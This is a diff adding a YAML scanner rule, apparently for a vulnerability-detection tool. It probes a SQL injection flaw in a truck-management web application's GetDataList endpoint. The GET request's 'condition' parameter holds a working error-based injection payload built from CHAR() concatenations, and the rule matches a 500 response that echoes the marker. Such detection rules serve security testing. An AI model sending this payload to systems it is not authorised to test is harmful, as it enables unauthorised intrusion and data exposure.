@@ -1,0 +1,11 @@
+cve-id: dongsheng-getdatalist-sqli
+rules:
+- method: GET
+  path: /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort&condition=123+IN+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113))--%20&page=1&page=1
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Connection: close
+    Accept-Encoding: gzip
+  expression: 'response.status == 500 && response.body.bcontains(b"qxpqqqzkqq") '
+severity: high
+type: sqli
